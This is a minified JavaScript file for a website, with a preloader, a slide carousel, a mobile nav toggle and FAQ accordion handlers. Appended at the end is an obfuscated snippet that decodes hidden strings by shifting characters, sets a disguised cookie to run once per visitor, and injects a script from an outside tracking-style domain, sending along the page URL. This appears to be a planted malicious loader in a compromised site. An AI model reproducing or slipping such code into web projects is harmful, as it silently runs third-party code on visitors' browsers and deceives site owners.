setTimeout((function(){var preloader=document.getElementById("preloader"),mainContent=document.getElementById("main-content");preloader.classList.add("loaded"),mainContent.style.display="block"}),4200);let activeIndex=0;const slides=document.getElementsByTagName("article"),handleLeftClick=()=>{const nextIndex=activeIndex-1>=0?activeIndex-1:slides.length-1,[currentSlide,nextSlide]=getSlideElements(activeIndex,nextIndex);setSlideStatus(currentSlide,"after"),setSlideStatus(nextSlide,"becoming-active-from-before"),setTimeout((()=>{setSlideStatus(nextSlide,"active"),activeIndex=nextIndex}))},handleRightClick=()=>{const nextIndex=activeIndex+1<=slides.length-1?activeIndex+1:0,[currentSlide,nextSlide]=getSlideElements(activeIndex,nextIndex);setSlideStatus(currentSlide,"before"),setSlideStatus(nextSlide,"becoming-active-from-after"),setTimeout((()=>{setSlideStatus(nextSlide,"active"),activeIndex=nextIndex}))},getSlideElements=(currentIndex,nextIndex)=>[document.querySelector(`[data-index="${currentIndex}"]`),document.querySelector(`[data-index="${nextIndex}"]`)],setSlideStatus=(slide,status)=>{slide.dataset.status=status},nav=document.querySelector("nav"),handleNavToggle=()=>{nav.dataset.transitionable="true",nav.dataset.toggled="true"===nav.dataset.toggled?"false":"true"},mediaQuery=window.matchMedia("(max-width: 800px)");function toggleFAQAnswer(event){event.target.nextElementSibling.classList.toggle("show"),event.target.classList.toggle("opened")}mediaQuery.onchange=e=>{nav.dataset.transitionable="false",nav.dataset.toggled="false"};const faqQuestions=document.querySelectorAll(".faq-question");faqQuestions.forEach((function(question){question.addEventListener("click",toggleFAQAnswer)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
